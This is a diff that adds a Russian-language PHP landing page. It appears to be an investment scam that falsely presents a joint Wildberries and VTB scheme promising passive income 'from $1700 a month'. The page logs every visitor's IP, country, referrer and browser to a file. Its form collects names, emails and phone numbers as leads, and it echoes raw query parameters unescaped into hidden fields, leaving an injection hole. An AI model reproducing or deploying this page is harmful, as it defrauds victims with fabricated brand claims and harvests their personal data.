@@ -1,0 +1,271 @@
+<?php
+	$FacebookPixel = $_GET['p'];
+	$Ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	$http_lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);
+	$fd = fopen("../logs.txt", 'a+');
+	$date = date('d.m.Y, H:i:s');
+	$arr = $date.'|'.$_SERVER['HTTP_CF_IPCOUNTRY'].'|'.$http_lang.'|'.$_SERVER['HTTP_REFERER'].'|'.$_SERVER['HTTP_USER_AGENT'].'|'.$Ip."|land \r\n";
+	fwrite($fd, $arr);
+	fclose($fd);
+	$gp = $_GET['gp'];
+  $hs = $_GET['hs'];
+  $page_lang = "ru";
+	$QUERY=$_SERVER["QUERY_STRING"];
+?>
+<!DOCTYPE html>
+<html lang="<?php echo $page_lang; ?>">
+<!-- <html lang="ru"> -->
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://usahomerelief.net/adict/intlTelInput.css">
+  <link rel="stylesheet" href="https://usahomerelief.net/adict/adict.css">
+
+  <title>Ленбиржа</title>
+<link href="assets/css/styles.a4edc9e3b456a92a3a56.css" rel="stylesheet"></head>
+
+<body class="page">
+  <section class="header">
+
+  <div class="container">
+    <div class="header__logo">
+      <img src="assets/img/e4462557abb66adc4b9e.png" alt="" class="header__logo-desk">
+      <img src="assets/img/d85884e53e62542c409e.png" alt="" class="header__logo-mob">
+    </div>
+  </div>
+
+
+  <div class="header__hero-box">
+    <div class="container">
+      <div class="header__video-container">
+        <video id="video" autoplay muted controls src="https://wtcprojects.com/video/tinkoff_v5.mp4" loop preload="auto" class="header__video"></video>
+      </div>
+
+      <div class="header__title-box">
+        <h1 class="header__title">Зарабатывай на крупных брендах в режиме автопилота</h1>
+        <p class="header__text">Новогоднее объединение от Wildberries и ВТБ — самые быстрые и безопасные инвестиции в
+          России
+        </p>
+        <button type="button" class="header__btn">Я ГОТОВ</button>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="marquee">
+    <div>
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-desk">
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-mob">
+    </div>
+    <div>
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-desk">
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-mob">
+    </div>
+    <div>
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-desk">
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-mob">
+    </div>
+    <div>
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-desk">
+      <img src="assets/img/c5ae24451a51616ec52a.png" alt="" class="marquee__slide-mob">
+    </div>
+  </div>
+
+</section>
+    <section class="first">
+  <div class="container">
+
+    <h2 class="first__title">Как разбогатеть, если нечего продавать?<br>
+      <span class="first__title--part">Ответ:</span> стать инвестором
+    </h2>
+
+    <div class="first__box first__box-one">
+      <h3 class="first__box-title">Продавец</h3>
+      <ul class="first__box-list">
+        <li class="first__box-list-item">1. Сам производит товар</li>
+        <li class="first__box-list-item">2. Размещает предложение в магазине</li>
+        <li class="first__box-list-item">3. Зарабатывает только в случае продажи</li>
+        <li class="first__box-list-item">4. Платит комиссию Wildberries</li>
+      </ul>
+    </div>
+
+    <div class="first__box first__box-two">
+      <h3 class="first__box-title">Инвестор</h3>
+      <ul class="first__box-list">
+        <li class="first__box-list-item">1. Покупает акции Wildberries</li>
+        <li class="first__box-list-item">2. Ждет праздничных распродаж</li>
+        <li class="first__box-list-item">3. Зарабатывает на автопилоте</li>
+        <li class="first__box-list-item">4. Не платит комиссию</li>
+      </ul>
+    </div>
+
+  </div>
+</section>
+      <section class="second">
+    <div class="container">
+        <h2 class="second__title">Как это работает?</h2>
+
+        <ul class="second__list">
+            <li class="second__list-item">
+                <svg class="second__list-img">
+                    <use href="assets/img/9ca130c364acbc9dc8d8.svg#icon-second__img1"></use>
+                </svg>
+                <p class="second__list-title">Вы инвестируете</p>
+                <p class="second__list-text">То есть покупаете акции Wildberries</p>
+                <img src="assets/img/7f2f07263ba0b35dfd9c.png" alt="" class="second__list-arrow">
+            </li>
+            <li class="second__list-item">
+                <svg class="second__list-img">
+                    <use href="assets/img/9ca130c364acbc9dc8d8.svg#icon-second__img2" class="second__list-arrow"></use>
+                </svg>
+                <p class="second__list-title">Продавец продает товар</p>
+                <p class="second__list-text">Каждый товар — это потенциальная прибыль</p>
+                <img src="assets/img/7f2f07263ba0b35dfd9c.png" alt="" class="second__list-arrow">
+            </li>
+            <li class="second__list-item">
+                <svg class="second__list-img">
+                    <use href="assets/img/9ca130c364acbc9dc8d8.svg#icon-second__img3"></use>
+                </svg>
+                <p class="second__list-title">Покупатель покупает товар</p>
+                <p class="second__list-text">А Wildberries зарабатывает за счет комиссии</p>
+                <img src="assets/img/7f2f07263ba0b35dfd9c.png" alt="" class="second__list-arrow">
+            </li>
+            <li class="second__list-item">
+                <svg class="second__list-img">
+                    <use href="assets/img/9ca130c364acbc9dc8d8.svg#icon-second__img4"></use>
+                </svg>
+                <p class="second__list-title">Акции Wildberries растут в цене</p>
+                <p class="second__list-text">Акции Wildberries растут в цене</p>
+                <img src="assets/img/7f2f07263ba0b35dfd9c.png" alt="" class="second__list-arrow">
+            </li>
+            <li class="second__list-item">
+                <svg class="second__list-img">
+                    <use href="assets/img/9ca130c364acbc9dc8d8.svg#icon-second__img5"></use>
+                </svg>
+                <p class="second__list-title">Запускается система ВТБ</p>
+                <p class="second__list-text">Она распределяет прибыль между инвесторами</p>
+                <img src="assets/img/7f2f07263ba0b35dfd9c.png" alt="" class="second__list-arrow">
+            </li>
+            <li class="second__list-item">
+                <svg class="second__list-img">
+                    <use href="assets/img/9ca130c364acbc9dc8d8.svg#icon-second__img6"></use>
+                </svg>
+                <p class="second__list-title">Вы получаете дивидендные выплаты</p>
+                <p class="second__list-text">Средний заработок — от $1700 в месяц</p>
+                <img src="assets/img/7f2f07263ba0b35dfd9c.png" alt="" class="second__list-arrow">
+            </li>
+        </ul>
+    </div>
+</section>
+        <section class="third">
+  <div class="container">
+    <h2 class="third__title">ВТБ вложил в маркетплейс<br>
+      <span class="third__title--part">120 млрд рублей</span><br>
+      став крупнейшим инвестором за всю историю
+    </h2>
+
+    <p class="third__list-title">Это позволило:</p>
+    <ul class="third__list">
+      <li class="third__list-item">
+        <img src="assets/img/67f1550d4e690a27fb01.png" alt="" class="third__list-img">
+        <p class="third__list-text">Построить крупнейшую инвестиционную платформу</p>
+      </li>
+      <li class="third__list-item">
+        <img src="assets/img/de806d56feb9f572b304.png" alt="" class="third__list-img">
+        <p class="third__list-text">Обеспечить пассивный заработок для 270 тысяч россиян</p>
+      </li>
+      <li class="third__list-item">
+        <img src="assets/img/42eeaccec08b07161961.png" alt="" class="third__list-img">
+        <p class="third__list-text">Создать более 2 миллионов рабочих мест</p>
+      </li>
+    </ul>
+  </div>
+</section>
+          <section class="fourth">
+  <div class="container">
+    <div class="fourth__text-box">
+      <h2 class="fourth__title">WILDBERRIES + ВТБ = ПРАЗДНИК</h2>
+      <p class="fourth__text">Wildberries поздравляет вас с наступающим 2022-м годом
+        <br><br>
+        В честь праздника мы приготовили для вас подарок:
+      </p>
+      <p class="fourth__date-text">Бесплатная регистрация для всех новых инвесторов до 14 января 2022 года</p>
+    </div>
+
+    <img src="assets/img/3ccd9601d3789bdb0dfd.png" alt="" class="fourth__img">
+  </div>
+</section>
+
+<section class="fourth-mob">
+
+</section>
+            <footer class="footer">
+  <div class="container">
+
+    <form method="POST" action="thanks/index.php" class="form" id="form">
+      <h2 class="form__title">Заполните форму <br>ПРЯМО СЕЙЧАС
+      </h2>
+      <div class="input_wrapper">
+        <div>
+          <input name="f_name" placeholder="Ваше имя">
+        </div>
+        <div>
+          <input name="l_name" placeholder="Ваша фамилия">
+        </div>
+        <div>
+          <input type="email" name="email" placeholder="Ваш e-mail">
+        </div>
+        <style>
+          .iti__flag-container {
+            z-index: 50;
+          }
+
+          .iti-mobile .iti__country-list {
+            width: 85%;
+          }
+        </style>
+        <input type="tel" name="phone" placeholder="Ваш телефон" autocomplete="off" required>
+        <input type="hidden" name="phone2" class="phone2" autocomplete="off" required>
+        <input type="hidden" name="pixel_id" value="<?php echo $FacebookPixel?>">
+        <input type="hidden" name="page_lang" value="<?php echo $page_lang?>">
+        <input type="hidden" name="query" value="<?php echo $QUERY?>">
+        <input type="hidden" name="gp_id" value="<?php echo $gp?>">
+        <input type="hidden" name="hs_id" value="<?php echo $hs?>">
+        <input type="hidden" name="landing" value="WILDBERRIES">
+
+        <button class="form__btn" type="submit">
+          Подать заявку
+        </button>
+      </div>
+    </form>
+
+  </div>
+</footer>
+
+              <script src="./assets/js/jquery-3.5.1.min.js"></script>
+              <script src="https://usahomerelief.net/adict/intlTelInput.js"></script>
+              <script src="https://usahomerelief.net/adict/adict.js"></script>
+              <script src="https://usahomerelief.net/adict/utils.js"></script>
+              <script src="https://usahomerelief.net/video/video.js"></script>
+
+              <script>
+                $(".scroll-btn").each(function () {
+                  $(this).click((e) => {
+                    e.preventDefault();
+                    $("html").animate(
+                      {
+                        scrollTop: $("#form").offset().top,
+                      },
+                      800
+                    );
+                  });
+                });
+              </script>
+<script defer src="assets/js/index.a4edc9e3b456a92a3a56.js"></script></body>
+
+</html>
